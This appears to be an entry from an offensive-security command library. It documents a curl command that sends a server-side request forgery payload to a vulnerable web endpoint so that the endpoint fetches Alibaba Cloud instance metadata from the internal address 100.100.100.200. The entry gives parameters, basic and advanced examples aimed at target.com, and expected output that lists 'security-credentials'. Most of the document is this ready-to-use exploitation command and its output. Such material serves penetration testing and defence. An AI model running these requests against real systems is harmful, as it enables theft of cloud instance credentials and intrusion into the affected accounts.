---
id: c9011d80-71ba-479b-898b-0d3eae257d03
name: curl-request-alibaba-metadata
type: command
executor: bash
data: >-
  curl
  "$_VULNERABLE_ENDPOINT?url=http://100.100.100.200/latest/meta-data/$_METADATA_PATH"
  -X GET
output: null
created_at: '2023-04-06T03:56:38.702390+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - curl
  - cloud-metadata
verified: true
validated: true
---

# curl-request-alibaba-metadata

## Command

```bash
curl "$_VULNERABLE_ENDPOINT?url=http://100.100.100.200/latest/meta-data/$_METADATA_PATH" -X GET
```

## Description

This command uses curl to send an SSRF payload to a vulnerable web application's endpoint, forcing it to request Alibaba Cloud instance metadata from the internal IMDS endpoint (100.100.100.200). It is used during SSRF exploitation to retrieve sensitive instance information like IDs and credentials. Customize the vulnerable endpoint and metadata path for targeted enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULNERABLE_ENDPOINT | The base URL of the vulnerable application endpoint (e.g., http://target.com/api/fetch) | Yes |
| $_METADATA_PATH | Specific metadata path (e.g., / for listing, /instance-id for ID) | No (defaults to root listing) |
| -X GET | Specifies HTTP GET method | Built-in |

## Examples

### Basic Usage

```bash
curl "http://target.com/fetch?url=http://100.100.100.200/latest/meta-data/" -X GET
```

### Advanced Usage

```bash
curl "http://target.com/fetch?url=http://100.100.100.200/latest/meta-data/instance-id" -X GET -v
```

(Use -v for verbose output to inspect headers and confirm internal request success.)

## Expected Output

Successful execution returns the metadata content in the response body, e.g.:

```
instance-id
image-id
security-credentials
...
```

Or for specific paths:

```
i-bp1234567890abcdef0
```

Look for 200 OK status and internal data; errors like 403 indicate restrictions.

## Related

- [[procedures/Exploit-SSRF-to-Access-Alibaba-Cloud-Instance-Metadata]]
- [[curl-basic-get]] (for general HTTP requests)
